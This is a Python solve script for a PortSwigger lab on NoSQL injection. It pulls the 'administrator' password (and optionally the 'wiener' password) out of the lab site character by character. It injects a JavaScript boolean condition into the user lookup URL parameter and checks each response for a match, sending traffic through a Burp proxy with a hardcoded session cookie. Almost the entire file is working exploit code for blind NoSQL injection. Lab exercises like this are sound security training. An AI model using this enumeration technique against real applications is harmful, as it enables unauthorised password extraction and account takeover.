# Portswigger Lab: Exploiting NoSQL injection to extract data
# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
# Author: d1Zzy666
# Date: 01-10-2024

"""
Execution path:
+ Identify NoSQL injection point (MANUAL)
- Charset needs to only include lowercase characters as per notes.
- Loop password for user "wiener" as test run.
- Loop password for user "administrator".

"""

# Libraries & imports etc.
import argparse
import base64
from datetime import datetime
from easy_py_server import EasyPyServer, Request, Response, MultipartFile, ResponseFile, ResponseConfig     # 3rd party reference - https://github.com/scientificRat/easy_py_server
from http.server import SimpleHTTPRequestHandler
import json
from multiprocessing import Process                                   
import os, signal, sys
import re
import requests
from socketserver import TCPServer
import time
import urllib3                                  # Used to suppress SSL warnings
from websocket import create_connection

# global variables
labid = "0aa9007704f8c0ee82a7514a005700fe"
targetdomain = "web-security-academy.net"         

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
user1name = "wiener"
user1pass = None
user2name = "administrator"
user2pass = None

table_names = []
cleaned_table_names = None


# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Function can be called for printing a line between - aesthetics of output	
def line():
	return "\n--------------------------------------------------------------------------------\n"

# Check current time
def currentTime():
    return datetime.now().strftime("%d-%m-%Y_%H:%M:%S")

print(datetime.now().strftime("%d-%m-%Y_%H:%M:%S") + " " + " - Portswigger Lab: NoSQL password enumeration script...")
print(line())


# Get wiener password
def getpass1():
    global user1name
    global user1pass
    user1pass = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving wiener password..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/user/lookup?user={user1name}'+%26%26+this.password[{position}]+%3d%3d+'{char}'+||+'a'%3d%3d'b"
            cookies = {"session": "sSLK7t6e4kW7Xoty1ckBYRJ1a315o8al"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/my-account?id={user1name}", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            x = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if f"{user1name}" in x.text:
                user1pass += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"{user1name} password is: {user1pass}")


# Get administrator password
def getpass2():
    global user2name
    global user2pass
    user2pass = ""
    position = 0
    session = requests.session()
    urllib3.disable_warnings()
    (print("Retrieving administrator password..."))
    while True:
        found_char = False
        for char in charset:
            url = f"https://{labid}.{targetdomain}:443/user/lookup?user={user2name}'+%26%26+this.password[{position}]+%3d%3d+'{char}'+||+'a'%3d%3d'b"
            cookies = {"session": "sSLK7t6e4kW7Xoty1ckBYRJ1a315o8al"}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": f"https://{labid}.{targetdomain}/my-account?id={user2name}", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            x = session.get(url, headers=headers, cookies=cookies, verify=False, proxies=proxies)
            if f"{user2name}" in x.text:
                user2pass += char
                print(f"[+] Identified a character {char} at position {position}.")
                position += 1
                found_char = True
                break

        if not found_char:
            break

    print(f"{user2name} password is: {user2pass}")

 

if __name__ == "__main__":
    currentTime()
    #getpass1()
    getpass2()
